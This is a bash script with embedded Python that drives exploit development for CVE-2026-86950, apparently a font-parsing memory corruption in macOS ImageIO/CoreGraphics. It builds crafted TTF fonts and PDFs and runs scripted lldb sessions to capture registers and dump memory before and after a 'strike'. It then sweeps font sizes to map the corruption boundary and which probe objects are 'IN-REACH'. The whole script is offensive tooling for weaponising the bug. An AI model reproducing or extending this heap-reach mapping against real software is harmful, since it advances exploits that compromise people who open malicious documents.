#!/bin/bash
# RIP-1: zone recon — x27 capture @+76, allocator-line pre/post forensics,
# canvas delta, probe-object reach map, boundary micro-grid. Campaign lane.
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render2 render2.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 8
clang -O2 -g -o render3 render3.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python - << 'PYB'
import sys; sys.path.insert(0, '.')
from gen_k2 import build_font
build_font("k2_q64.ttf", 64)
build_font("k2_s32640.ttf", 32640)
print("fonts built")
PYB
./venv/bin/python gen_pdf.py k2_q64.pdf k2_q64.ttf
./venv/bin/python gen_pdf.py k2_s32640.pdf k2_s32640.ttf

# --- lldb session A: survive L=64, capture x27 + pre-line dumps + probe reach map
{
  echo "breakpoint set -n aa_cache_render"
  echo "process launch -- k2_q64.pdf a.png"
  for i in $(seq 19); do echo "stepi"; done
  echo "register read x27 x22"
  for o in 0x1f0000 0x1f8000 0x1fc000 0x1fe000 0x200000 0x202000; do
    echo "memory read --size 8 --count 64 --format x \$x27+$o"
  done
  echo "continue"
  echo "detach"
  echo "quit"
} > cmdsA.txt
lldb -b -s cmdsA.txt ./render3 > sessA.txt 2>&1 || true

# --- lldb session B: strike L=32640, pre/post diff around the line
{
  echo "breakpoint set -n aa_cache_render"
  echo "process launch -- k2_s32640.pdf b.png"
  for i in $(seq 19); do echo "stepi"; done
  echo "register read x27 x22"
  for o in 0x1f0000 0x1f8000 0x1fc000 0x1fe000 0x200000 0x202000; do
    echo "memory read --size 8 --count 64 --format x \$x27+$o"
  done
  echo "continue"
  echo "bt"
  echo "register read x27 pc lr"
  for o in 0x1f0000 0x1f8000 0x1fc000 0x1fe000 0x200000 0x202000; do
    echo "memory read --size 8 --count 64 --format x \$x27+$o"
  done
  echo "quit"
} > cmdsB.txt
lldb -b -s cmdsB.txt ./render3 > sessB.txt 2>&1 || true

# --- plain strike grid (no lldb): boundary micro-map + flake retest + controls
./venv/bin/python - << 'PYG'
import subprocess, hashlib, os, sys
sys.path.insert(0, '.')
from gen_k2 import build_font
rows = []
Ls = list(range(32640, 32768, 8)) + [32768, 32770, 32800] + [31744]*5
for L in Ls:
    ttf = f"k2_g{L}.ttf"; pdf = f"k2_g{L}.pdf"; png = f"g{L}.png"
    try:
        build_font(ttf, L)
        subprocess.run(['./venv/bin/python','gen_pdf.py',pdf,ttf], check=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        r = subprocess.run(['./render2', pdf, png], capture_output=True, timeout=120)
        canvas = ''
        for ln in r.stderr.decode(errors='replace').splitlines():
            if 'CANVAS' in ln: canvas = ln
        d = open(png,'rb').read() if os.path.exists(png) else b''
        rows.append((L, r.returncode, hashlib.md5(d).hexdigest()[:12] if d else '-', canvas))
        print("strike L=%d rc=%d md5=%s %s" % (L, r.returncode, rows[-1][2], canvas))
        if os.path.exists(png): os.remove(png)
    except Exception as e:
        rows.append((L, 'EXC', str(e)[:60], ''))
        print("strike L=%d EXC %s" % (L, e))
with open('strikes.csv','w') as f:
    f.write("L,rc,md5,canvas\n")
    for r in rows: f.write(",".join(map(str,r))+"\n")
print("GRID DONE", len(rows))
PYG

# --- analysis: reach map + forensics diff
./venv/bin/python - << 'PYA'
import re
def parse_session(fn):
    txt = open(fn, errors='replace').read()
    out = {'x27': None, 'dumps': [], 'bt': '', 'stop': ''}
    m = re.search(r'x27 = (0x[0-9a-f]+)', txt)
    if m: out['x27'] = int(m.group(1), 16)
    out['bt'] = " ".join(l.strip() for l in txt.splitlines() if 'frame #' in l)[:600]
    for ms in re.finditer(r'stop reason = (.*)', txt): out['stop'] += ms.group(1)+' | '
    # memory read blocks: lines "0xADDR: v v v ..."
    cur = []
    for ln in txt.splitlines():
        m2 = re.match(r'^(0x[0-9a-f]+):\s((?:0x[0-9a-f]+\s*)+)$', ln.strip())
        if m2:
            addr = int(m2.group(1),16)
            for v in m2.group(2).split():
                cur.append((addr, int(v,16))); addr += 8
        elif cur:
            out['dumps'].append(cur); cur = []
    if cur: out['dumps'].append(cur)
    out['probes'] = re.findall(r'(PROBE\d[^ ]*|CANVAS copybase)=(0x[0-9a-f]+)', txt)
    out['canvas'] = re.search(r'CANVAS copybase=(0x[0-9a-f]+)', txt)
    out['canvas'] = int(out['canvas'].group(1),16) if out['canvas'] else None
    out['relcb'] = 'REL_CB fired' in txt
    return out
A = parse_session('sessA.txt'); B = parse_session('sessB.txt')
rep = open('rip1_report.txt','w')
def W(*a): print(*a); print(*a, file=rep)
W("=== RIP-1 ZONE RECON REPORT ===")
W("session A: x27=%s canvas=%s relcb=%s stop=%s" % (hex(A['x27']) if A['x27'] else '?', hex(A['canvas']) if A['canvas'] else '?', A['relcb'], A['stop']))
if A['x27']:
    for name, addr in A['probes']:
        d = int(addr,16) - A['x27']
        W("  reach %s=%s delta=%s%d %s" % (name, addr, '+' if d>=0 else '', d, "IN-REACH" if 0 < d <= 0x210000 else ""))
    W("  canvas delta=%s" % (A['canvas']-A['x27'] if A['canvas'] else '?'))
W("session B: x27=%s stop=%s" % (hex(B['x27']) if B['x27'] else '?', B['stop']))
W("  bt: %s" % B['bt'][:400])
if B['x27'] and len(B['dumps']) >= 12:
    pre, post = B['dumps'][:6], B['dumps'][6:12]
    W("=== STRIKE FOOTPRINT (pre vs post, addr-x27) ===")
    nchg = 0
    for pi in range(min(len(pre), len(post))):
        pmap = dict(pre[pi])
        for addr, v in post[pi]:
            if pmap.get(addr) != v:
                nchg += 1
                if nchg <= 40:
                    W("  chg %s%d: %s -> %s" % ('+' if addr-B['x27']>=0 else '', addr-B['x27'], hex(pmap.get(addr,0)), hex(v)))
    W("  total changed qwords:", nchg)
elif B['dumps']:
    W("  dumps captured:", len(B['dumps']), "(post missing = survive?)")
W("=== boundary header scan (session B pre, non-node qwords) ===")
if B['x27'] and B['dumps']:
    for addr, v in B['dumps'][2][:64]:
        off = addr - B['x27']
        if v and not (0x130000000 <= v <= 0x160000000):
            W("  +%#x = %#x" % (off, v))
rep.close()
PYA

cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/{sessA.txt,sessB.txt,rip1_report.txt,strikes.csv,cmdsA.txt,cmdsB.txt} findings/ 2>/dev/null
cp detonation/cve-2026-86950/{a.png,b.png} findings/ 2>/dev/null
ls findings/ | wc -l
cat detonation/cve-2026-86950/rip1_report.txt 2>/dev/null | head -60
